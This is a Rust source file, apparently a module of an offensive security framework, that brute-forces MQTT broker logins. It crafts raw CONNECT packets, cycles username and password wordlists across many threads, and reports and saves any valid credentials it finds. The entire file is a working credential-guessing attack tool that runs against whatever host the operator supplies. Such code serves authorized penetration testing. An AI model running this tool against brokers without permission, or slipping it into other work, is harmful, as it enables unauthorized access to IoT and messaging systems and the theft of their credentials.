use anyhow::{anyhow, Context, Result};
use colored::*;
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;

const PROGRESS_INTERVAL_SECS: u64 = 2;
const MQTT_CONNECT_TIMEOUT_MS: u64 = 3000;
const MQTT_READ_TIMEOUT_MS: u64 = 2000;

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   MQTT Brute Force Module                              ║".cyan());
    println!("{}", "║   Tests MQTT broker authentication                     ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

#[derive(Clone)]
struct MqttBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    client_id: String,
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());
    println!();
    let port = prompt_port(1883);
    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let password_wordlist = prompt_wordlist("Password wordlist file: ")?;
    let threads = prompt_threads(8);
    let stop_on_success = prompt_yes_no("Stop on first valid login?", true);
    let full_combo = prompt_yes_no("Try every username with every password?", false);
    let verbose = prompt_yes_no("Verbose mode?", false);
    let client_id = prompt_default("MQTT Client ID", "rustsploit_client");
    
    let config = MqttBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        client_id,
    };
    run_mqtt_bruteforce(config)
}

fn run_mqtt_bruteforce(config: MqttBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        return Err(anyhow!("Username or password wordlist is empty."));
    }
    println!("{}", format!("[*] Loaded {} username(s).", usernames.len()).cyan());
    println!("{}", format!("[*] Loaded {} password(s).", passwords.len()).cyan());
    
    let total_attempts = if config.full_combo { 
        usernames.len() * passwords.len() 
    } else { 
        passwords.len() 
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();
    
    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();
    if config.full_combo {
        for u in &usernames { 
            for p in &passwords { 
                tx.send((u.clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
            } 
        }
    } else if usernames.len() == 1 {
        for p in &passwords { 
            tx.send((usernames[0].clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
        }
    } else if passwords.len() == 1 {
        for u in &usernames { 
            tx.send((u.clone(), passwords[0].clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
        }
    } else {
        for p in &passwords { 
            tx.send((usernames[0].clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
        }
    }
    drop(tx);
    
    // Start progress reporter thread
    let progress_stop = Arc::clone(&stop_flag);
    let progress_stats = Arc::clone(&stats);
    let progress_handle = std::thread::spawn(move || {
        while !progress_stop.load(Ordering::Relaxed) {
            progress_stats.print_progress();
            std::thread::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS));
        }
    });
    
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let found = Arc::clone(&found);
        let unknown = Arc::clone(&unknown);
        let stats = Arc::clone(&stats);
        let config = config.clone();
        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if stop_flag.load(Ordering::Relaxed) { 
                    break; 
                }
                match try_mqtt_login(&addr, &user, &pass, &config.client_id) {
                    Ok(true) => {
                        println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
                        let mut creds = found.lock().unwrap(); 
                        creds.push((user.clone(), pass.clone()));
                        stats.record_attempt(true, false);
                        if config.stop_on_success {
                            stop_flag.store(true, Ordering::Relaxed);
                            // Drain remaining items from channel
                            while rx.try_recv().is_ok() {}
                            break;
                        }
                    }
                    Ok(false) => {
                        stats.record_attempt(false, false);
                        if config.verbose {
                            println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
                        }
                    }
                    Err(e) => {
                        stats.record_attempt(false, true);
                        let msg = e.to_string();
                        {
                            let mut unk = unknown.lock().unwrap();
                            unk.push((user.clone(), pass.clone(), msg.clone()));
                        }
                        if config.verbose { 
                            eprintln!("\r{}", format!("[?] {}:{} -> {}", user, pass, msg).yellow()); 
                        }
                    }
                }
            }
        });
    }
    pool.join();
    
    // Stop progress reporter
    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.join();
    
    // Print final statistics
    stats.print_final();
    let found_guard = found.lock().unwrap();
    if found_guard.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", found_guard.len()).green().bold());
        for (u, p) in found_guard.iter() { 
            println!("  {}  {}:{}", "✓".green(), u, p); 
        }
        if prompt("\nSave found credentials? (y/n): ").trim().eq_ignore_ascii_case("y") {
            let f = prompt("What should the valid results be saved as?: ");
            if !f.trim().is_empty() {
                save_results(&f, &found_guard)?;
                println!("{}", format!("[+] Results saved to {}", f).green());
            } else {
                println!("{}", "[-] Filename cannot be empty. Skipping save.".yellow());
            }
        }
    }
    drop(found_guard);

    let unknown_guard = unknown.lock().unwrap();
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored MQTT responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if prompt("Save unknown responses to file? (y/n): ")
            .trim()
            .eq_ignore_ascii_case("y")
        {
            let default_name = "mqtt_bruteforce_unknown.txt";
            let fname = prompt(&format!(
                "What should the unknown results be saved as? [{}]: ",
                default_name
            ));
            let chosen = if fname.trim().is_empty() {
                default_name.to_string()
            } else {
                fname.trim().to_string()
            };
            if let Err(e) = save_unknown_mqtt(&chosen, &unknown_guard) {
                println!("{}", format!("[!] Failed to save unknown responses: {}", e).red());
            } else {
                println!("{}", format!("[+] Unknown responses saved to {}", chosen).green());
            }
        }
    }

    Ok(())
}

/// Try MQTT CONNECT with username/password
/// Returns Ok(true) if connection accepted, Ok(false) if auth failed, Err on connection/protocol error
fn try_mqtt_login(addr: &str, username: &str, password: &str, client_id: &str) -> Result<bool> {
    let socket = addr.to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow!("Could not resolve address"))?;
    
    let mut stream = TcpStream::connect_timeout(
        &socket, 
        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS)
    )
    .context("Connection timeout")?;
    
    stream.set_read_timeout(Some(Duration::from_millis(MQTT_READ_TIMEOUT_MS)))
        .map_err(|e| anyhow!("Failed to set read timeout: {}", e))?;
    stream.set_write_timeout(Some(Duration::from_millis(MQTT_READ_TIMEOUT_MS)))
        .map_err(|e| anyhow!("Failed to set write timeout: {}", e))?;
    
    // Build MQTT CONNECT packet
    let mut packet = Vec::new();
    
    // Fixed header: CONNECT (0x10), remaining length will be set later
    packet.push(0x10); // CONNECT packet type
    
    // Variable header: Protocol name + version + flags + keep alive
    let protocol_name = b"MQTT";
    let protocol_level = 0x04; // MQTT 3.1.1
    
    // Username flag (bit 7) and Password flag (bit 6) in connect flags
    let connect_flags = 0xC0; // 0b11000000 = username + password flags set
    let keep_alive: u16 = 60; // 60 seconds
    
    // Calculate variable header length
    let mut var_header = Vec::new();
    var_header.extend_from_slice(&(protocol_name.len() as u16).to_be_bytes());
    var_header.extend_from_slice(protocol_name);
    var_header.push(protocol_level);
    var_header.push(connect_flags);
    var_header.extend_from_slice(&keep_alive.to_be_bytes());
    
    // Payload: Client ID, Username, Password
    let mut payload = Vec::new();
    
    // Client ID (UTF-8 string, 2 bytes length + data)
    let client_id_bytes = client_id.as_bytes();
    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(client_id_bytes);
    
    // Username (UTF-8 string, 2 bytes length + data)
    let username_bytes = username.as_bytes();
    payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(username_bytes);
    
    // Password (UTF-8 string, 2 bytes length + data)
    let password_bytes = password.as_bytes();
    payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(password_bytes);
    
    // Calculate remaining length (variable header + payload)
    let remaining_length = var_header.len() + payload.len();
    
    // Encode remaining length (MQTT variable length encoding)
    let mut remaining_length_bytes = Vec::new();
    let mut x = remaining_length;
    loop {
        let mut byte = (x % 128) as u8;
        x /= 128;
        if x > 0 {
            byte |= 0x80;
        }
        remaining_length_bytes.push(byte);
        if x == 0 {
            break;
        }
    }
    
    // Build complete packet
    packet.extend_from_slice(&remaining_length_bytes);
    packet.extend_from_slice(&var_header);
    packet.extend_from_slice(&payload);
    
    // Send CONNECT packet
    use std::io::Write;
    stream.write_all(&packet)
        .context("Failed to send CONNECT packet")?;
    stream.flush()
        .context("Failed to flush CONNECT packet")?;
    
    // Read CONNACK response
    use std::io::Read;
    let mut response = [0u8; 4];
    let n = stream.read(&mut response)
        .context("Failed to read CONNACK response")?;
    
    if n < 2 {
        return Err(anyhow!("CONNACK response too short"));
    }
    
    // Check packet type (should be 0x20 = CONNACK)
    if response[0] != 0x20 {
        return Err(anyhow!("Expected CONNACK (0x20), got 0x{:02x}", response[0]));
    }
    
    // Check return code (byte 3 in variable header)
    if n >= 4 {
        let return_code = response[3];
        match return_code {
            0x00 => {
                // Success - send DISCONNECT and return true
                let disconnect = vec![0xE0, 0x00]; // DISCONNECT packet
                stream.write_all(&disconnect).ok();
                stream.flush().ok();
                return Ok(true);
            }
            0x04 => {
                // Bad username or password
                return Ok(false);
            }
            0x05 => {
                // Not authorized
                return Ok(false);
            }
            _ => {
                return Err(anyhow!("CONNACK return code: 0x{:02x}", return_code));
            }
        }
    } else {
        // If we didn't get enough bytes, assume failure
        return Ok(false);
    }
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)
        .context(format!("Failed to open file: {}", path))?;
    Ok(BufReader::new(file)
        .lines()
        .filter_map(Result::ok)
        .filter(|s| !s.trim().is_empty())
        .collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)
        .context(format!("Failed to create file: {}", path))?;
    for (u, p) in creds { 
        writeln!(file, "{}:{}", u, p)
            .context(format!("Failed to write to file: {}", path))?; 
    }
    Ok(())
}

fn save_unknown_mqtt(path: &str, entries: &[(String, String, String)]) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)
        .context(format!("Failed to create file: {}", path))?;

    writeln!(file, "# MQTT Bruteforce Unknown/Errored Responses")
        .context(format!("Failed to write to file: {}", path))?;
    writeln!(file, "# Format: username:password - error/response")
        .context(format!("Failed to write to file: {}", path))?;
    writeln!(file)
        .context(format!("Failed to write to file: {}", path))?;

    for (user, pass, msg) in entries {
        writeln!(file, "{}:{} - {}", user, pass, msg)
            .context(format!("Failed to write to file: {}", path))?;
    }

    Ok(())
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    if let Err(e) = io::stdout().flush() {
        eprintln!("[!] Failed to flush stdout: {}", e);
    }
    let mut b = String::new();
    match io::stdin().read_line(&mut b) {
        Ok(_) => b.trim().to_string(),
        Err(e) => {
            eprintln!("[!] Failed to read input: {}", e);
            String::new()
        }
    }
}

fn prompt_default(msg: &str, default: &str) -> String {
    let input = prompt(&format!("{} [{}]: ", msg, default));
    if input.trim().is_empty() {
        default.to_string()
    } else {
        input.trim().to_string()
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt(&format!("Port (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(0) => println!("[!] Port cannot be zero. Please enter a value between 1 and 65535."),
            Ok(port) => return port,
            Err(_) => println!("[!] Invalid port. Please enter a number between 1 and 65535."),
        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Threads (default {}): ", default));
        if input.is_empty() {
            return default.max(1);
        }
        if let Ok(value) = input.parse::<usize>() {
            if value >= 1 && value <= 1024 {
                return value;
            }
        }
        println!("[!] Invalid thread count. Please enter a value between 1 and 1024.");
    }
}

fn prompt_yes_no(message: &str, default_yes: bool) -> bool {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        let input = prompt(&format!("{} (y/n) [{}]: ", message, default_char));
        if input.is_empty() {
            return default_yes;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(message: &str) -> Result<String> {
    loop {
        let response = prompt(message);
        if response.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = response.trim();
        if Path::new(trimmed).is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!(
                "{}",
                format!("File '{}' does not exist or is not a regular file.", trimmed).yellow()
            );
        }
    }
}

fn normalize_target(host: &str, port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$")
        .map_err(|e| anyhow!("Regex compilation error: {}", e))?;
    let t = host.trim();
    let cap = re.captures(t)
        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
    let addr = cap.get(1)
        .ok_or_else(|| anyhow!("Invalid target: {}", host))?
        .as_str();
    let p = cap.get(2)
        .map(|m| m.as_str().parse::<u16>().ok())
        .flatten()
        .unwrap_or(port);
    let f = if addr.contains(':') && !addr.starts_with('[') { 
        format!("[{}]:{}", addr, p) 
    } else { 
        format!("{}:{}", addr, p) 
    };
    if f.to_socket_addrs()?.next().is_none() { 
        Err(anyhow!("DNS resolution failed: {}", f)) 
    } else { 
        Ok(f) 
    }
}
